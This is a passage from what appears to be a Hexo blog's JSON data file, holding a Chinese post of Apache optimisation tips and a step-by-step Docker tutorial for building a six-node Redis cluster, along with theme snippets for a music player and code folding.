rotatelogs 工具进行日志切割，保证单个日志文件不过大。\n\n```bash\nCustomLog \"| /bin/rotatelogs -l /wwwlogs/access %Y%m%d.log 86400\" combined\n```\n\n<!-- more -->\n\n* 美化错误页面\n\n* 屏蔽Apache版本信息等敏感信息\n\n主要是为了防止对应版本的恶意攻击。\n\n* 配置静态缓存\n\n* 禁止解析 PHP 文件\n\n* 配置 CDN。","source":"_posts/Apache-Opt.md","raw":"---\ntitle: Apache 优化着手点\ndate: 2023-10-06 14:09:32\ncategories: 理论知识\ntags:\n  - 面试\n  - Linux\n---\n\n* 利用Apache自带的 rotatelogs 工具进行日志切割，保证单个日志文件不过大。\n\n```bash\nCustomLog \"| /bin/rotatelogs -l /wwwlogs/access %Y%m%d.log 86400\" combined\n```\n\n<!-- more -->\n\n* 美化错误页面\n\n* 屏蔽Apache版本信息等敏感信息\n\n主要是为了防止对应版本的恶意攻击。\n\n* 配置静态缓存\n\n* 禁止解析 PHP 文件\n\n* 配置 CDN。","slug":"Apache-Opt","published":1,"updated":"2024-05-03T03:55:54.713Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5cn00037zj39kam6cez","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><ul>\n<li>利用Apache自带的 rotatelogs 工具进行日志切割，保证单个日志文件不过大。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CustomLog <span class=\"string\">&quot;| /bin/rotatelogs -l /wwwlogs/access %Y%m%d.log 86400&quot;</span> combined</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<ul>\n<li><p>美化错误页面</p>\n</li>\n<li><p>屏蔽Apache版本信息等敏感信息</p>\n</li>\n</ul>\n<p>主要是为了防止对应版本的恶意攻击。</p>\n<ul>\n<li><p>配置静态缓存</p>\n</li>\n<li><p>禁止解析 PHP 文件</p>\n</li>\n<li><p>配置 CDN。</p>\n</li>\n</ul>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<ul>\n<li>利用Apache自带的 rotatelogs 工具进行日志切割，保证单个日志文件不过大。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CustomLog <span class=\"string\">&quot;| /bin/rotatelogs -l /wwwlogs/access %Y%m%d.log 86400&quot;</span> combined</span><br></pre></td></tr></table></figure>","more":"<ul>\n<li><p>美化错误页面</p>\n</li>\n<li><p>屏蔽Apache版本信息等敏感信息</p>\n</li>\n</ul>\n<p>主要是为了防止对应版本的恶意攻击。</p>\n<ul>\n<li><p>配置静态缓存</p>\n</li>\n<li><p>禁止解析 PHP 文件</p>\n</li>\n<li><p>配置 CDN。</p>\n</li>\n</ul>"},{"title":"搭建Redis集群","date":"2023-08-13T07:19:35.000Z","_content":"\n### 操作步骤\n\n1. 下载镜像\n\n```bash\ndocker pull redis:6.0.8\n```\n\n<!-- more -->\n\n2. 生成容器\n\n```bash\ndocker run -d --name redis-node-1 --net host --privileged=true -v /docker/redis/share/redis-node-1:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6381\ndocker run -d --name redis-node-2 --net host --privileged=true -v /docker/redis/share/redis-node-2:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6382\ndocker run -d --name redis-node-3 --net host --privileged=true -v /docker/redis/share/redis-node-3:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6383\ndocker run -d --name redis-node-4 --net host --privileged=true -v /docker/redis/share/redis-node-4:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6384\ndocker run -d --name redis-node-5 --net host --privileged=true -v /docker/redis/share/redis-node-5:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6385\ndocker run -d --name redis-node-6 --net host --privileged=true -v /docker/redis/share/redis-node-6:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6386\n```\n\n效果展示：\n\n```bash\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND                  CREATED              STATUS              PORTS     NAMES\n61d59245db3d   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-6\n223fad42e069   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-5\nf0055941fe3f   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-4\ne361d9695a0c   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-3\n400119c3015c   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-2\n61e2e38927c4   redis:6.0.8   \"docker-entrypoint.s…\"   4 minutes ago        Up 4 minutes                  redis-node-1\n```\n\n3. 构建主从关系\n\n随便进入一台容器，在这里使用1号机进行演示。\n\n* 进入容器\n\n```bash\ndocker exec -it redis-node-1 js 折叠代码\n```\n\n* 建立集群\n\n```bash\nredis-cli --cluster create 192.168.1.42:6381 192.168.1.42:6382 192.168.1.42:6383 192.168.1.42:6384 192.168.1.42:6385 192.168.1.42:6386 --cluster-replicas 1\n```\n\n--cluster-replicas 1 一个主服务器配置一个从服务器。\n\n之后出现下面这行提示，按要求输入`yes`\n\n```bash\nCan I set the above configuration? (type 'yes' to accept): yes\n```\n\n出现下面的提示代表集群建立完成：\n\n```bash\n[OK] All nodes agree about slots configuration.\n>>> Check for open slots...\n>>> Check slots coverage...\n[OK] All 16384 slots covered.\n```\n\n4. 查看集群信息\n\n```bash\nredis-cli -p 6381\ncluster info\ncluster nodes\n```\n\n效果展示：\n\n```bash 折叠代码\nroot@knight:/data# redis-cli -p 6381\n127.0.0.1:6381> cluster info\ncluster_state:ok\ncluster_slots_assigned:16384\ncluster_slots_ok:16384\ncluster_slots_pfail:0\ncluster_slots_fail:0\ncluster_known_nodes:6\ncluster_size:3\ncluster_current_epoch:6\ncluster_my_epoch:1\ncluster_stats_messages_ping_sent:335\ncluster_stats_messages_pong_sent:315\ncluster_stats_messages_sent:650\ncluster_stats_messages_ping_received:310\ncluster_stats_messages_pong_received:335\ncluster_stats_messages_meet_received:5\ncluster_stats_messages_received:650\n\n127.0.0.1:6381> cluster nodes\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1691914813226 3 connected 10923-16383\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 slave f999e35136ec2e61fcceebf182f5c38ef4a4354d 0 1691914812223 1 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1691914811000 2 connected 5461-10922\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1691914812000 2 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1691914812000 3 connected\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,master - 0 1691914809000 1 connected 0-5460\n127.0.0.1:6381> \n```\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n换成自己主机的IP，端口号随便是集群的任何一个容器的都可以。\n\n效果展示：\n\n```bash 折叠代码\nroot@knight:/data# redis-cli --cluster check 192.168.1.42:6381\n192.168.1.42:6381 (f999e351...) -> 0 keys | 5461 slots | 1 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 5461 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 5462 slots | 1 slaves.\n[OK] 2 keys in 3 masters.\n0.00 keys per slot on average.\n>>> Performing Cluster Check (using node 192.168.1.42:6381)\nM: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots:[0-5460] (5461 slots) master\n   1 additional replica(s)\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[10923-16383] (5461 slots) master\n   1 additional replica(s)\nS: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots: (0 slots) slave\n   replicates f999e35136ec2e61fcceebf182f5c38ef4a4354d\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[5461-10922] (5462 slots) master\n   1 additional replica(s)\n[OK] All nodes agree about slots configuration.\n>>> Check for open slots...\n>>> Check slots coverage...\n[OK] All 16384 slots covered.\nroot@knight:/data# \n```","source":"_posts/BuildRedis.md","raw":"---\ntitle: 搭建Redis集群\ndate: 2023-08-13 15:19:35\ncategories: 技术\ntags:\n  - Docker\n  - Redis\n---\n\n### 操作步骤\n\n1. 下载镜像\n\n```bash\ndocker pull redis:6.0.8\n```\n\n<!-- more -->\n\n2. 生成容器\n\n```bash\ndocker run -d --name redis-node-1 --net host --privileged=true -v /docker/redis/share/redis-node-1:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6381\ndocker run -d --name redis-node-2 --net host --privileged=true -v /docker/redis/share/redis-node-2:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6382\ndocker run -d --name redis-node-3 --net host --privileged=true -v /docker/redis/share/redis-node-3:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6383\ndocker run -d --name redis-node-4 --net host --privileged=true -v /docker/redis/share/redis-node-4:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6384\ndocker run -d --name redis-node-5 --net host --privileged=true -v /docker/redis/share/redis-node-5:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6385\ndocker run -d --name redis-node-6 --net host --privileged=true -v /docker/redis/share/redis-node-6:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6386\n```\n\n效果展示：\n\n```bash\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND                  CREATED              STATUS              PORTS     NAMES\n61d59245db3d   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-6\n223fad42e069   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-5\nf0055941fe3f   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-4\ne361d9695a0c   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-3\n400119c3015c   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-2\n61e2e38927c4   redis:6.0.8   \"docker-entrypoint.s…\"   4 minutes ago        Up 4 minutes                  redis-node-1\n```\n\n3. 构建主从关系\n\n随便进入一台容器，在这里使用1号机进行演示。\n\n* 进入容器\n\n```bash\ndocker exec -it redis-node-1 js 折叠代码\n```\n\n* 建立集群\n\n```bash\nredis-cli --cluster create 192.168.1.42:6381 192.168.1.42:6382 192.168.1.42:6383 192.168.1.42:6384 192.168.1.42:6385 192.168.1.42:6386 --cluster-replicas 1\n```\n\n--cluster-replicas 1 一个主服务器配置一个从服务器。\n\n之后出现下面这行提示，按要求输入`yes`\n\n```bash\nCan I set the above configuration? (type 'yes' to accept): yes\n```\n\n出现下面的提示代表集群建立完成：\n\n```bash\n[OK] All nodes agree about slots configuration.\n>>> Check for open slots...\n>>> Check slots coverage...\n[OK] All 16384 slots covered.\n```\n\n4. 查看集群信息\n\n```bash\nredis-cli -p 6381\ncluster info\ncluster nodes\n```\n\n效果展示：\n\n```bash 折叠代码\nroot@knight:/data# redis-cli -p 6381\n127.0.0.1:6381> cluster info\ncluster_state:ok\ncluster_slots_assigned:16384\ncluster_slots_ok:16384\ncluster_slots_pfail:0\ncluster_slots_fail:0\ncluster_known_nodes:6\ncluster_size:3\ncluster_current_epoch:6\ncluster_my_epoch:1\ncluster_stats_messages_ping_sent:335\ncluster_stats_messages_pong_sent:315\ncluster_stats_messages_sent:650\ncluster_stats_messages_ping_received:310\ncluster_stats_messages_pong_received:335\ncluster_stats_messages_meet_received:5\ncluster_stats_messages_received:650\n\n127.0.0.1:6381> cluster nodes\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1691914813226 3 connected 10923-16383\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 slave f999e35136ec2e61fcceebf182f5c38ef4a4354d 0 1691914812223 1 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1691914811000 2 connected 5461-10922\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1691914812000 2 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1691914812000 3 connected\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,master - 0 1691914809000 1 connected 0-5460\n127.0.0.1:6381> \n```\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n换成自己主机的IP，端口号随便是集群的任何一个容器的都可以。\n\n效果展示：\n\n```bash 折叠代码\nroot@knight:/data# redis-cli --cluster check 192.168.1.42:6381\n192.168.1.42:6381 (f999e351...) -> 0 keys | 5461 slots | 1 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 5461 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 5462 slots | 1 slaves.\n[OK] 2 keys in 3 masters.\n0.00 keys per slot on average.\n>>> Performing Cluster Check (using node 192.168.1.42:6381)\nM: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots:[0-5460] (5461 slots) master\n   1 additional replica(s)\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[10923-16383] (5461 slots) master\n   1 additional replica(s)\nS: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots: (0 slots) slave\n   replicates f999e35136ec2e61fcceebf182f5c38ef4a4354d\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[5461-10922] (5462 slots) master\n   1 additional replica(s)\n[OK] All nodes agree about slots configuration.\n>>> Check for open slots...\n>>> Check slots coverage...\n[OK] All 16384 slots covered.\nroot@knight:/data# \n```","slug":"BuildRedis","published":1,"updated":"2024-05-03T03:55:54.713Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5cs00077zj3cmq04ha7","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>下载镜像</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull redis:6.0.8</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<ol start=\"2\">\n<li>生成容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d --name redis-node-1 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-1:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6381</span><br><span class=\"line\">docker run -d --name redis-node-2 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-2:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6382</span><br><span class=\"line\">docker run -d --name redis-node-3 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-3:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6383</span><br><span class=\"line\">docker run -d --name redis-node-4 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-4:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6384</span><br><span class=\"line\">docker run -d --name redis-node-5 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-5:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6385</span><br><span class=\"line\">docker run -d --name redis-node-6 --net host --privileged=<span class=\"literal\">true</span> -v /docker/redis/share/redis-node-6:/data redis:6.0.8 --cluster-enabled <span class=\"built_in\">yes</span> --appendonly <span class=\"built_in\">yes</span> --port 6386</span><br></pre></td></tr></table></figure>\n\n<p>效果展示：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/docker<span class=\"comment\"># docker ps</span></span><br><span class=\"line\">CONTAINER ID   IMAGE         COMMAND                  CREATED              STATUS              PORTS     NAMES</span><br><span class=\"line\">61d59245db3d   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute             redis-node-6</span><br><span class=\"line\">223fad42e069   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute             redis-node-5</span><br><span class=\"line\">f0055941fe3f   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute             redis-node-4</span><br><span class=\"line\">e361d9695a0c   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute             redis-node-3</span><br><span class=\"line\">400119c3015c   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   About a minute ago   Up About a minute             redis-node-2</span><br><span class=\"line\">61e2e38927c4   redis:6.0.8   <span class=\"string\">&quot;docker-entrypoint.s…&quot;</span>   4 minutes ago        Up 4 minutes                  redis-node-1</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>构建主从关系</li>\n</ol>\n<p>随便进入一台容器，在这里使用1号机进行演示。</p>\n<ul>\n<li>进入容器</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it redis-node-1 js 折叠代码</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>建立集群</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster create 192.168.1.42:6381 192.168.1.42:6382 192.168.1.42:6383 192.168.1.42:6384 192.168.1.42:6385 192.168.1.42:6386 --cluster-replicas 1</span><br></pre></td></tr></table></figure>\n\n<p>–cluster-replicas 1 一个主服务器配置一个从服务器。</p>\n<p>之后出现下面这行提示，按要求输入<code>yes</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Can I <span class=\"built_in\">set</span> the above configuration? (<span class=\"built_in\">type</span> <span class=\"string\">&#x27;yes&#x27;</span> to accept): <span class=\"built_in\">yes</span></span><br></pre></td></tr></table></figure>\n\n<p>出现下面的提示代表集群建立完成：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[OK] All nodes agree about slots configuration.</span><br><span class=\"line\">&gt;&gt;&gt; Check <span class=\"keyword\">for</span> open slots...</span><br><span class=\"line\">&gt;&gt;&gt; Check slots coverage...</span><br><span class=\"line\">[OK] All 16384 slots covered.</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>查看集群信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -p 6381</span><br><span class=\"line\">cluster info</span><br><span class=\"line\">cluster nodes</span><br></pre></td></tr></table></figure>\n\n<p>效果展示：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6381</span></span><br><span class=\"line\">127.0.0.1:6381&gt; cluster info</span><br><span class=\"line\">cluster_state:ok</span><br><span class=\"line\">cluster_slots_assigned:16384</span><br><span class=\"line\">cluster_slots_ok:16384</span><br><span class=\"line\">cluster_slots_pfail:0</span><br><span class=\"line\">cluster_slots_fail:0</span><br><span class=\"line\">cluster_known_nodes:6</span><br><span class=\"line\">cluster_size:3</span><br><span class=\"line\">cluster_current_epoch:6</span><br><span class=\"line\">cluster_my_epoch:1</span><br><span class=\"line\">cluster_stats_messages_ping_sent:335</span><br><span class=\"line\">cluster_stats_messages_pong_sent:315</span><br><span class=\"line\">cluster_stats_messages_sent:650</span><br><span class=\"line\">cluster_stats_messages_ping_received:310</span><br><span class=\"line\">cluster_stats_messages_pong_received:335</span><br><span class=\"line\">cluster_stats_messages_meet_received:5</span><br><span class=\"line\">cluster_stats_messages_received:650</span><br><span class=\"line\"></span><br><span class=\"line\">127.0.0.1:6381&gt; cluster nodes</span><br><span class=\"line\">41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1691914813226 3 connected 10923-16383</span><br><span class=\"line\">849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 slave f999e35136ec2e61fcceebf182f5c38ef4a4354d 0 1691914812223 1 connected</span><br><span class=\"line\">6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1691914811000 2 connected 5461-10922</span><br><span class=\"line\">8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1691914812000 2 connected</span><br><span class=\"line\">9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1691914812000 3 connected</span><br><span class=\"line\">f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,master - 0 1691914809000 1 connected 0-5460</span><br><span class=\"line\">127.0.0.1:6381&gt; </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>换成自己主机的IP，端口号随便是集群的任何一个容器的都可以。</p>\n<p>效果展示：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span 